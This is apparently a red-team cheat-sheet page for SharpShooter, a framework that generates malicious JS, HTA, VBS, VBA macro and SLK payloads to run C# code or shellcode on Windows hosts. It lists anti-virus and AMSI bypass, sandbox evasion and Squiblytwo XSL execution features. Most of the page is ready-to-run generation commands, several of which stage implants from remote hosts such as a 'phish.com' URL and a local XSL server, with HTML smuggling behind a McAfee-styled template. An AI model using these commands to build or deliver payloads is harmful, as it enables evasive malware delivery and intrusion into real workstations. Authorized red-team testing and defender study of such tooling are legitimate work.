# ⭕ SharpShooter

A payload creation framework for the retrieval and execution of arbitrary C# source code in a variety of formats, such HTA, JS, VBS, JSE, VBA, VBE and WSF.

{% hint style="info" %}
Those payloads are RC4 encrypted with a random key to provide some modest anti-virus evasion, and the project includes the capability to integrate sandbox detection and environment keying to assist in evading detection. SharpShooter targets v2, v3 and v4 of the .NET framework which will be found on most end-user Windows workstations.
{% endhint %}

#### <mark style="color:green;">Features:</mark>

* `Sandbox Detection` : several default techniques to evade detection, including identifying tools
* `Stageless Execution` : with ability to inject an in-memory shellcode directly into the process, this framework supports full fileless mode
* `XSL Exploitation` : (Squiblytwo) bypasses signatures and security solutions by executing XSL (eXtensible Stylesheet Language) full trust scripts from the WMIC command line
* `Squiblydoo and Squiblytwo` support: COM Staging and XSL Exploitation directly through COM
* `AMSI Bypass` : uses XPath expression on the XSL file to bypass Windows Defender AMSI signature

{% embed url="https://github.com/mdsecactivebreach/SharpShooter" %}

{% embed url="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0" %}

### <mark style="color:orange;">Installation</mark>

```
sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git
cd SharpShooter/
apt install python-pip
sudo pip install -r requirements.txt
```

## <mark style="color:red;">Generating Payloads</mark>

### <mark style="color:orange;">Stageless JavaScript</mark>

```
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
```

### <mark style="color:orange;">Stageless HTA</mark>

```
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
```

### <mark style="color:orange;">Staged VBS</mark>

```
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```

### <mark style="color:orange;">Custom CSharp inside VBS</mark>

```
SharpShooter.py --dotnetver 2 --payload js --sandbox 2,3,4,5 --delivery web --refs mscorlib.dll,System.Windows.Forms.dll --namespace MDSec.SharpShooter --entrypoint Main --web http://www.phish.com/implant.payload --output malicious --smuggle --template mcafee
```

### <mark style="color:orange;">Squiblytwo VBS</mark>

```
SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com outlook --awlurl http://192.168.2.8:8080/foo.xsl
```

### <mark style="color:orange;">XSL HTA</mark>

```
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```

### <mark style="color:orange;">VBA Macro</mark>

```
SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```

### <mark style="color:orange;">Excel 4.0 SLK Macro Enabled Document</mark>

```
SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee
```
